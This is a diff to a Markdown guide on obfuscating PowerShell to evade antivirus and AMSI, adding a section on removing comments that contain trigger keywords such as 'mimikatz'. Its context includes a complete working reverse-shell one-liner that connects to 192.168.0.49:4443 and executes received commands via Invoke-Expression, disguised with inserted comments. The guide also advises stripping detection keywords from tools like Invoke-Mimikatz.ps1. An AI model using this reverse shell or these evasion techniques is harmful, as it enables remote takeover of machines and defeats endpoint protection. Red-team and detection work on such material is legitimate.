@@ -3,7 +3,7 @@
 ## Techniques
 1. [Obfuscate Boolean Values](#Obfuscate-Boolean-Values)
 2. [Cmdlet Quote Interruption](#Cmdlet-Quote-Interruption)
-3. [Append Comments](Append-Comments)
+3. [Append/Remove Comments](Append/Remove-Comments)
 
 ## Obfuscate Boolean Values
 It's super fun and easy to replace `$True` and `$False` values with other boolean equivalents, which are literaly unlimited. All of the examples below evaluate to `True`. You can reverse them to `False` by simply adding an exclamation mark before the expression (e.g., `![bool]0x01`):
@@ -89,7 +89,8 @@ ie""x'' "p`"`"w''d`"`""
 # You get the point.
 ```
 
-## Append Comments
+## Append/Remove Comments
+### Appending Comments
 Obfuscating a script by appending comments here and there might actually do the trick on its own:
 for example, a reverse shell command could be obfuscated like this:
 
@@ -98,3 +99,9 @@ Original
 
 Modified (appended <# SOME RANDOM COMMENT #> in various places)  
 ```$TCPClient = New-Object <# SOME RANDOM COMMENT #> Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream() <# SOME RANDOM COMMENT #>;$StreamWriter = New-Object <# SOME RANDOM COMMENT #> IO.StreamWriter($NetworkStream);function WriteToStream ($String) <# SOME RANDOM COMMENT #> {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); <# SOME RANDOM COMMENT #> $Output = try {Invoke-Expression $Command 2>&1 | Out-String} <# SOME RANDOM COMMENT #> catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```
+
+### Removing Comments
+There are malware-ish keywords that will trigger AMSI immediatly and should be replaced when obfuscating scripts. Check this out:
+
+Just by typing the work 'mimikatz' in the terminal AMSI is having a stroke. 
+These keywords may be found in comments as well, so it's a good idea to remove them, especially from FOS resources you grab from the internet (e.g. `Invoke-Mimikatz.ps1` from GitHub). \*It's a good idea to remove comments generally, this was just an example.
